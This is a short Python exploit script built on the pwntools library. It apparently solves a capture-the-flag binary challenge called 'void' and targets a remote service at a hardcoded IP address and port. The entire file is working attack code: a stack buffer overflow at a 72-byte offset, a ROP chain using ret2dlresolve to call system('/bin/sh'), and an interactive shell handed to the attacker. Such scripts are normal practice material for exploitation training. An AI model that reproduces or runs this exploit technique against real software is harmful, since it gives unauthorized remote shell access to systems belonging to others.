from pwn import *

gs = '''
b *vuln
continue
'''

elf = context.binary = ELF("./void_patched")

def start():
    if args.REMOTE:
        return remote("94.237.59.199", 31284)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            #return process(elf.path)
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

offset = 72

rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

print("[+] GOT: ", elf.got)
print("[+] PLT: ", elf.plt)

payload = b"".join([
    b"A"*offset,
    p64(pop_rdi),
    p64(0x0),
    p64(elf.plt.read)
])

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A'*offset)
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

#log.info(rop.dump())

io.sendline(rop.chain())
io.sendline(dlresolve.payload)

io.interactive()
